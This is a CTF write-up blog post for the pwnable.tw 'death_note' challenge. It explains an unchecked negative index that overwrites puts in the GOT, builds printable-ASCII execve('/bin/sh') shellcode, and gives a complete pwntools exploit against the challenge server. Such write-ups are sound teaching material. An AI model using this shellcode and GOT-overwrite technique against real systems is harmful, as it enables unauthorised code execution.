---
layout: post
title:  "death_note [pwnable.tw]"
date:   2021-05-30 19:45:00 +0530
categories: pwn shellcode
---
The binary given is a 32-bit ELF. Here is its checksec output:

![checksec-output](/images/death_note/checksec.png)

The challenge description is: **Write the shellcode on your Death Note.**
It is clear from this that its a shellcode challenge. Now time to hunt for the bug!

Using ghidra to decompile, it can be seen that there is a bug in the add_note function:
{% highlight c %}
void add_note(void)

{
  int iVar1;
  int iVar2;
  char *pcVar3;
  int in_GS_OFFSET;
  char local_60 [80];
  int local_10;

  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Index :");
  iVar1 = read_int();
  if (10 < iVar1) {	// Bug here O_O
    puts("Out of bound !!");
    exit(0);
  }

  printf("Name :");
  read_input(local_60,0x50);
  iVar2 = is_printable(local_60); // Checks if shellcode is printable
  if (iVar2 != 0) {
    pcVar3 = strdup(local_60);
    *(char **)(note + iVar1 * 4) = pcVar3; // input pointer stored at note+index*4
    puts("Done !");
    if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
      __stack_chk_fail();
    }
    return;
  }
  puts("It must be a printable name !");
  exit(-1);
}
{% endhighlight %}<br/>

The program checks only if our offset is greater than 10, it doesn't check for negative values. Also it can be seen that our input is constrainted to be only printable ASCII characters (numbers, symbols, uppercase & lowercase alphabets)

The GOT addresses are at a negative offset from **note**, so providing a specific negative index in add_note will overwrite GOT with a pointer to our input on heap. puts is called after the overwrite so overwriting puts will work in this case. Calculating the offset of puts from note we get `-64`, so our index will be -16.

Now the fun part - shellcode! Since shellcode is limited to printable characters, we have pop, push & certain xor instructions. Also there is a pointer to our shellcode in edx. 

My plan is to call an execve syscall. I started off by pushing "/bin///sh" on stack and moving it to ebx.
{% highlight c %}
push 0x68
push 0x732f2f2f
push 0x6e69622f
push esp
pop ebx
{% endhighlight %}<br/>
The next obstacle is that `int 0x80` which is essential to make a syscall assembles to "\xcd\x80" which is not printable. To workaround this, the shellcode can be made such that it uses xor to alter the last 2 bytes of input to 0xcd & 0x80. Hence last two bytes of shellcode will be " +" which on xoring induvidually with 0x53 & 0x70 give "\xcd\x80".
{% highlight c %}
push edx
pop eax
push 0x53
pop edx
sub byte ptr [eax+39],dl
sub byte ptr [eax+40],dl
push 0x70
pop edx
xor byte ptr [eax+40],dl
{% endhighlight %}<br/>
Finally eax,ecx and edx have to be set to appropriate values in order to perform the execve syscall.
{% highlight c %}
push ecx
pop eax
push ecx
pop edx
xor al,43
xor al,32
{% endhighlight %}<br/>
Now the shellcode is done! Time to finish off the exploit.
{% highlight python %}
#!/usr/bin/env python2
from pwn import *

exe = ELF("./death_note")
context.binary = exe
context.terminal = "kitty sh -c".split()
IP, PORT = "chall.pwnable.tw", 10201

global io
breakpoints = '''
break *0x80487ea
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

def add_note(offset,payload):
    reu(" :")
    s("1")
    reu(" :")
    s(str(offset))
    reu(" :")
    sl(payload)

def is_printable(shellcode):
    for i in range(len(shellcode)):
        if ord(shellcode[i]) < 0x1f or ord(shellcode[i]) > 0x7f:
            return False
    return True

shellcode = asm('''
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x53
    pop edx
    sub byte ptr [eax+39],dl
    sub byte ptr [eax+40],dl
    push 0x70
    pop edx
    xor byte ptr [eax+40],dl
  
    push ecx
    pop eax
    push ecx
    pop edx
    xor al,43
    xor al,32
''')+"\x20\x43"

assert is_printable(shellcode)

add_note(-16,shellcode)

io.interactive()
{% endhighlight %}